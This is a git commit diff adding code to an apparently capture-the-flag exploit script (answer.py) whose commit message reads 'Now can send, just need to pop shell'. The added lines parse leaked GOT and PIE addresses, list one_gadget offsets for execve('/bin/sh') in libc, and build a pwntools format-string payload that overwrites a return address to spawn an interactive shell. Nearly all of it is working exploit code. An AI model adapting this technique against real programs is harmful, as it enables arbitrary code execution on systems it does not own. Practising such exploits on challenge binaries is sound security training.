a73b322ba674d2c47b13da2a7f6db04a0814cc2e
Malachi Parks <Malachiparks1999@gmail.com>
2022-03-18 13:49:23 -0400

    Now can send, just need to pop shell

--- PCPs/Pacecar16/answer.py
+++ PCPs/Pacecar16/answer.py
@@ -91,11 +91,58 @@ def main():
     print("SENDING PAYLOAD 1")
     runningProc.sendline(payload)
     runningProc.recvuntil('\x7f')   # Stop here to encapsulate data only required
-    # Following line from writeup --- attempted this my way and would always creash
+    # Following line from writeup --- attempted this my way and would always crash, or the offset wouldn't be the start of libc which was annoying
     libcLeak = u64(runningProc.recvuntil('\x7f').ljust(8, b'\x00'))  # Grab up to this byte, then grab until termination, tried this like above and wouldn't work
     print("LIBC LEAK ADDR: ", libcLeak)
     startLibc = libcLeak - libc.sym[leak_func]
     print("START LIBC: ", hex(startLibc))
+
+    # Attempt to launch shell
+    # Recapture the leaks again
+    # Pull leak info for GOT leak
+    runningProc.recvuntil(b"This stack leak might be useful ")  # Used to differentiate the two leaks sinec both have similar wording
+    GOTLeak = runningProc.recvuntil(b"\n")
+    print("GOT LEAK: ", GOTLeak)        # Leak value check
+    GOTLeakInt = int(GOTLeak, 16)
+
+    # Pull leak info for Main leakThis stack leak might be useful
+    runningProc.recvuntil(b"And this PIE leak might be useful ")
+    PIELeak = runningProc.recvuntil(b"\n")
+    print("PIE LEAK: ", PIELeak)        # Leak value check
+    PIELeakInt = int(PIELeak, 16)
+
+    # Reset this incase value was mangled!
+    InstrPtr = InstrPtr = GOTLeakInt + buffer + 8 # 8 = RBP length!
+
+    # Attempting to find one gadget to launch shell!
+    # One gadget cmd: one_gadget libc.so.6
+    '''
+    LIST OF GADGETS --- all offsets since PIE is on
+
+    └─$ one_gadget libc.so.6
+    0xe3b2e execve("/bin/sh", r15, r12)
+    constraints:
+    [r15] == NULL || r15 == NULL
+    [r12] == NULL || r12 == NULL
+
+    0xe3b31 execve("/bin/sh", r15, rdx)
+    constraints:
+    [r15] == NULL || r15 == NULL
+    [rdx] == NULL || rdx == NULL
+
+    0xe3b34 execve("/bin/sh", rsi, rdx)
+    constraints:
+    [rsi] == NULL || rsi == NULL
+    [rdx] == NULL || rdx == NULL
+    '''
+    oneGadgetOffset = 0xe3b34
+    popShell = libc.address + oneGadgetOffset   # Since offset can find by adding to libc start
+    payload = fmtstr_payload(offset, {InstrPtr: popShell})  # Pack payload
+
+    # See if get shell!
+    runningProc.sendline(payload)
+    runningProc.interactive()
+
 
 
 # Execute the function main when written
